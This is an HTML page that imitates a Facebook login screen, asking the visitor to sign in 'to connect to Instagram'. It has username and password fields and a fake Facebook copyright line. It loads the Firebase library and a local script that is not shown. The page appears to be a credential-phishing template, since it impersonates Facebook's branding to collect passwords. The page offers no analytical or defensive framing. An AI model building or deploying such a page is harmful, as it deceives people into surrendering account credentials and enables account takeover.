<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Facebook</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" media="screen" href="css/fb.css" />
</head>
<body>
    
    <div class="fb-header">
        <div class="fb-logo"></div>
    </div>

    <div class="insta-logo">
        <img src="./insta_logo.png" alt="" srcset="">
        <p>Log in to your Facebook account to connect to Instagram</p>
    </div>

    <form>
        <div class="input-group">
            <input type="text" name="" id="username" placeholder="Mobile number or email address">
        </div>
        <div class="input-group">
            <input type="password" name="" id="password" placeholder="Facebook password" >
        </div>

        <div class="fb-login-btn">
            Log In
        </div>
    </form>

    <div class="bottom-links">
        <a href="https://m.facebook.com/reg/">
            Create account
        </a>
    </div>

    <div class="bottom-links">
        <a href="/">
            Not now
        </a>
    </div>

    <div class="bottom-links">
        <span>
            Forgotten password? · Help Center
        </span>
    </div>

    <div class="bottom-links" style="margin-top:75px">
        <span>
            Facebook ©2019
        </span>
    </div>

    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://www.gstatic.com/firebasejs/5.8.6/firebase.js"></script>
    <script src="js/index.js"></script>
</body>
</html>
